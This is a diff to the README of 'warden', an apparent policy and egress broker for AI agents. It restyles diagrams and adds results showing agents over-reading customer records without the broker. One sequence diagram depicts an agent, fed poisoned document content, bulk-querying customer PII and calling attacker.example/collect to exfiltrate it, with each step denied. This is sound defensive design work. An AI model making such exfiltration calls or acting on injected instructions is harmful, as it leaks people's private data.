@@ -143,6 +143,24 @@ the way, once through the broker. Same task, same prompt, same policy bundle
 > Recorded 2026-08-02 · `gemini-3.6-flash` · 15 min 27 s of wall time · commits
 > `341194c` / `0c801ec`
 
+```
+  report · customer records read
+    no broker   ████████████████████████████████████████████  20,651
+    warden      ▏                                                  1
+
+  crosscheck · customer records read
+    no broker   ████████████████████████████████████████████       3
+    warden      ███████████████                                    1
+
+  share · customer data into internal systems (bytes)
+    no broker   ████████████████████████████████████████████     119
+    warden                                                         0
+```
+
+Each pair shares a scale; the three pairs do not, so compare down a pair and
+not across them. `▏` marks a value too small to draw — one record against
+twenty thousand.
+
 | Scenario | The agent was asked to | Without the broker | With it | Rule that fired |
 |---|---|---|---|---|
 | `report` | compile a plan-distribution report | **20,651** customer records read | **1** record · 4 calls refused | `rows.bounded` |
@@ -229,29 +247,48 @@ too.
 
 ```mermaid
 flowchart LR
-    subgraph yours["Your agent — code unchanged"]
-        Loop["Agent loop"]
-        SDK["Model SDK, HTTP client, curl…"]
+    subgraph YOURS["YOUR AGENT — code unchanged"]
+        direction TB
+        Loop(["Agent loop"])
+        SDK(["Model SDK · HTTP client · curl"])
     end
 
-    subgraph broker["warden"]
-        API["Tool API :8080"]
-        Proxy["Egress proxy :3128"]
-        Policy["Policy + taint + audit"]
+    subgraph WARDEN["WARDEN"]
+        direction TB
+        API["Tool API<br/>:8080"]
+        Proxy["Egress proxy<br/>:3128"]
+        Gate{{"Policy · taint · audit"}}
     end
 
-    subgraph out["Your systems"]
-        Sys["Databases, internal APIs, mail"]
+    subgraph OUT["YOUR SYSTEMS"]
+        direction TB
+        Sys["Databases · internal APIs · mail"]
         Net["Allowlisted external hosts"]
     end
 
-    Loop -->|"BROKER_URL + Bearer token"| API
-    SDK -->|"HTTP_PROXY with the token in the URL"| Proxy
-    API --> Policy
-    Proxy --> Policy
-    Policy -->|"allow"| Sys
-    Policy -->|"allow"| Net
-    Policy -->|"deny + audit record"| Refused["403 naming the rule"]
+    Refused["403 + X-Warden-Rule<br/>· audit record written"]
+
+    Loop -- "BROKER_URL + Bearer token" --> API
+    SDK -- "HTTP_PROXY, token in the URL" --> Proxy
+    API --> Gate
+    Proxy --> Gate
+    Gate -- "allow" --> Sys
+    Gate -- "allow" --> Net
+    Gate -- "deny" --> Refused
+
+    classDef caller fill:#B23A34,stroke:#8B2A25,color:#FFFFFF
+    classDef enforce fill:#6D4FD6,stroke:#5340AE,color:#FFFFFF
+    classDef core fill:#4527A0,stroke:#341E7A,color:#FFFFFF
+    classDef target fill:#2E7D5B,stroke:#226046,color:#FFFFFF
+    class Loop,SDK caller
+    class API,Proxy,Refused enforce
+    class Gate core
+    class Sys,Net target
+    style YOURS fill:#FBEAE8,stroke:#B23A34,color:#7A241F
+    style WARDEN fill:#EEE9FC,stroke:#6D4FD6,color:#3F2E8C
+    style OUT fill:#E3F2EB,stroke:#2E7D5B,color:#1D4E39
+    linkStyle 4,5 stroke:#2E7D5B,stroke-width:2px
+    linkStyle 6 stroke:#6D4FD6,stroke-width:2px
 ```
 
 ### The two surfaces
@@ -429,35 +466,38 @@ does not fire. Adversarial `opa eval`, not `opa test`, is what found them.
 
 ```mermaid
 flowchart LR
-    subgraph untrusted["UNTRUSTED — agent-net, internal: true"]
-        Poison["Poisoned document content"]
-        Reply["Model provider response"]
-        Agent["Agent runtime"]
+    subgraph UNTRUSTED["UNTRUSTED — agent-net, internal: true"]
+        direction TB
+        Poison["Poisoned<br/>document content"]
+        Reply["Model provider<br/>response"]
+        Agent(["Agent runtime"])
     end
 
-    subgraph enforcing["TRUSTED ENFORCEMENT — warden broker"]
+    subgraph ENFORCE["TRUSTED ENFORCEMENT — warden broker"]
+        direction TB
         API["Tool API"]
         Proxy["Egress proxy"]
-        PDP["Policy decision point"]
-        Audit["Hash-chained audit log"]
+        PDP{{"Policy decision point"}}
+        Audit[("Hash-chained<br/>audit log")]
     end
 
-    subgraph control["CONTROL PLANE — backend-net only"]
-        Mint["broker-control · holds the private key"]
+    subgraph CONTROL["CONTROL PLANE — backend-net only"]
+        Mint["broker-control<br/>holds the private key"]
     end
 
-    subgraph protected["PROTECTED SYSTEMS"]
+    subgraph PROTECTED["PROTECTED SYSTEMS"]
+        direction TB
         DB[("customers.db")]
-        Internal["docstore.internal · mailer.internal"]
-        Ext["Allowlisted external hosts"]
+        Internal["docstore.internal<br/>mailer.internal"]
+        Ext["Allowlisted<br/>external hosts"]
     end
 
     Poison --> Agent
     Reply --> Agent
-    Mint -->|"scoped 5-minute task token"| Agent
+    Mint -- "scoped 5-minute task token" --> Agent
 
-    Agent -->|"Bearer token"| API
-    Agent -->|"CONNECT + Proxy-Authorization"| Proxy
+    Agent -- "Bearer token" --> API
+    Agent -- "CONNECT + Proxy-Authorization" --> Proxy
 
     API --> PDP
     Proxy --> PDP
@@ -470,6 +510,24 @@ flowchart LR
 
     Agent -. "no route exists" .-> Mint
     Agent -. "no gateway exists" .-> Ext
+
+    classDef untrusted fill:#B23A34,stroke:#8B2A25,color:#FFFFFF
+    classDef enforce fill:#6D4FD6,stroke:#5340AE,color:#FFFFFF
+    classDef core fill:#4527A0,stroke:#341E7A,color:#FFFFFF
+    classDef control fill:#976D19,stroke:#795714,color:#FFFFFF
+    classDef target fill:#2E7D5B,stroke:#226046,color:#FFFFFF
+    classDef store fill:#37474F,stroke:#263238,color:#FFFFFF
+    class Poison,Reply,Agent untrusted
+    class API,Proxy enforce
+    class PDP core
+    class Audit store
+    class Mint control
+    class DB,Internal,Ext target
+    style UNTRUSTED fill:#FBEAE8,stroke:#B23A34,color:#7A241F
+    style ENFORCE fill:#EEE9FC,stroke:#6D4FD6,color:#3F2E8C
+    style CONTROL fill:#FAF1DF,stroke:#A8791C,color:#6B4C0F
+    style PROTECTED fill:#E3F2EB,stroke:#2E7D5B,color:#1D4E39
+    linkStyle 12,13 stroke:#B23A34,stroke-width:2px,stroke-dasharray:6 4
 ```
 
 The two dotted edges are the paths that **must not exist**. Both are enforced
@@ -497,48 +555,51 @@ against a fully compromised broker.
 
 ```mermaid
 flowchart TB
-    Client["Agent runtime — untrusted"]
-    Ctl["broker-control · control_main.py"]
+    Ctl["broker-control<br/>control_main.py"]
+    Client(["Agent runtime · untrusted"])
 
-    subgraph broker["warden broker — one process, one worker"]
-        API["Tool API :8080 · app.py"]
-        Proxy["Egress proxy :3128 · proxy.py"]
-        Ident["Token verifier · identity.py"]
-        Cat["Tool catalog · config/catalog.py"]
-        Taint["Taint + row budget · taint.py"]
-        PDPc["PDP client · pdp.py"]
-        Aud["Audit log · audit.py"]
+    subgraph BROKER["WARDEN BROKER — one process, one worker"]
+        direction TB
+        API["Tool API :8080<br/>app.py"]
+        Proxy["Egress proxy :3128<br/>proxy.py"]
+        Ident["Token verifier<br/>identity.py"]
+        Cat["Tool catalog<br/>config/catalog.py"]
+        Taint["Taint + row budget<br/>taint.py"]
+        PDPc["PDP client<br/>pdp.py"]
+        Aud[("Audit log<br/>audit.py")]
     end
 
-    OPA["OPA 1.19.0 :8181 · authz.rego + data.json"]
+    OPA{{"OPA 1.19.0 :8181<br/>authz.rego + data.json"}}
 
-    subgraph adapters["Adapters · broker/adapters/"]
+    subgraph ADAPT["ADAPTERS — broker/adapters/"]
+        direction LR
         Doc["docstore"]
         Sql["sql"]
         Http["http"]
         Mail["mail"]
     end
 
-    subgraph protected["Protected systems"]
+    subgraph PROT["PROTECTED SYSTEMS"]
+        direction LR
         DS["docstore.internal"]
         DB[("customers.db")]
-        MS["mailer.internal"]
         Ext["Allowlisted hosts"]
+        MS["mailer.internal"]
     end
 
-    Ctl -->|"Ed25519 task token"| Client
-    Client -->|"Bearer"| API
-    Client -->|"CONNECT"| Proxy
+    Ctl -- "Ed25519 task token" --> Client
+    Client -- "Bearer" --> API
+    Client -- "CONNECT" --> Proxy
 
     API --> Ident
     API --> Cat
     API --> Taint
     API --> PDPc
     Proxy --> PDPc
-    PDPc -->|"input document"| OPA
-    OPA -->|"allow + deny_reasons"| PDPc
+    PDPc -- "input document" --> OPA
+    OPA -- "allow + deny_reasons" --> PDPc
 
-    API -->|"written before execution"| Aud
+    API -- "written before execution" --> Aud
     Proxy --> Aud
 
     API --> Doc
@@ -548,9 +609,29 @@ flowchart TB
 
     Doc --> DS
     Sql --> DB
-    Mail --> MS
     Http --> Ext
+    Mail --> MS
     Proxy --> Ext
+
+    classDef untrusted fill:#B23A34,stroke:#8B2A25,color:#FFFFFF
+    classDef enforce fill:#6D4FD6,stroke:#5340AE,color:#FFFFFF
+    classDef core fill:#4527A0,stroke:#341E7A,color:#FFFFFF
+    classDef control fill:#976D19,stroke:#795714,color:#FFFFFF
+    classDef target fill:#2E7D5B,stroke:#226046,color:#FFFFFF
+    classDef store fill:#37474F,stroke:#263238,color:#FFFFFF
+    classDef plumbing fill:#7760DB,stroke:#5D41D4,color:#FFFFFF
+    class Client untrusted
+    class Ctl control
+    class API,Proxy enforce
+    class Ident,Cat,Taint,PDPc plumbing
+    class Aud store
+    class OPA core
+    class Doc,Sql,Http,Mail plumbing
+    class DS,DB,Ext,MS target
+    style BROKER fill:#EEE9FC,stroke:#6D4FD6,color:#3F2E8C
+    style ADAPT fill:#F4F1FD,stroke:#7760DB,color:#3F2E8C
+    style PROT fill:#E3F2EB,stroke:#2E7D5B,color:#1D4E39
+    linkStyle 10 stroke:#37474F,stroke-width:2px
 ```
 
 | Component | Responsibility | Trust level | Failure impact |
@@ -622,30 +703,44 @@ concurrent, and it happens after the decision.
 
 ```mermaid
 sequenceDiagram
+    autonumber
     participant A as Agent
     participant B as Broker
     participant P as OPA
     participant L as Audit log
     participant T as Protected system
 
-    A->>B: Invoke tool + Bearer token
-    B->>B: Verify token, validate args, describe target
-    B->>P: Input document + task state
+    rect rgba(178, 58, 52, 0.10)
+        Note over A,B: Untrusted request
+        A->>B: Invoke tool + Bearer token
+    end
+
+    rect rgba(109, 79, 214, 0.10)
+        Note over B,P: Decide before acting
+        B->>B: Verify token, validate args, describe target
+        B->>P: Input document + task state
+    end
+
     alt Allowed
-        P-->>B: allow, deny_reasons []
-        B->>L: Record allow
-        L-->>B: Durable
-        B->>T: Execute
-        T-->>B: Result
+        P-->>B: allow · deny_reasons []
+        rect rgba(55, 71, 79, 0.12)
+            Note over B,L: Durable before the action
+            B->>L: Record allow
+            L-->>B: Written
+        end
+        rect rgba(46, 125, 91, 0.10)
+            B->>T: Execute
+            T-->>B: Result
+        end
         B->>B: Record rows + data class
         B-->>A: Result
     else Denied
         P-->>B: deny_reasons [rule]
         B->>L: Record deny
-        B-->>A: 403 with the rule that fired
+        B-->>A: 403 naming the rule that fired
     else Enforcement unavailable
         P--xB: Unreachable or incoherent
-        B->>L: Record deny (pdp.unavailable)
+        B->>L: Record deny · pdp.unavailable
         B-->>A: 403
     end
 ```
@@ -662,20 +757,31 @@ per-call authorization structurally cannot see:
 
 ```mermaid
 sequenceDiagram
+    autonumber
     participant A as Agent
     participant B as Broker
     participant D as customers.db
 
-    A->>B: query_customers(id=8812) — 1 row
-    B->>D: Allowed
-    D-->>A: 1 record
-    Note over B: task now holds data_class=pii
-    A->>B: query_customers(filter=all) — 10,312 rows
-    B-->>A: DENY rows.bounded (1 + 10,312 > 50)
-    A->>B: http_fetch(attacker.example/collect)
-    B-->>A: DENY egress.allowlist
-    A->>B: http_fetch(docstore.internal/feedback)
-    B-->>A: DENY egress.pii_sink — allowlisted, but the task holds PII
+    rect rgba(46, 125, 91, 0.10)
+        Note over A,D: In scope, in budget
+        A->>B: query_customers(id=8812) · 1 row
+        B->>D: Allowed
+        D-->>A: 1 record
+    end
+
+    rect rgba(69, 39, 160, 0.12)
+        Note over B: The task now holds data_class=pii<br/>Every later decision receives this
+    end
+
+    rect rgba(178, 58, 52, 0.10)
+        Note over A,D: Each request is individually plausible
+        A->>B: query_customers(filter=all) · 10,312 rows
+        B-->>A: DENY rows.bounded · 1 + 10,312 > 50
+        A->>B: http_fetch(attacker.example/collect)
+        B-->>A: DENY egress.allowlist
+        A->>B: http_fetch(docstore.internal/feedback)
+        B-->>A: DENY egress.pii_sink · allowlisted, but the task holds PII
+    end
 ```
 
 The third denial is the one that matters. `docstore.internal` is on the egress
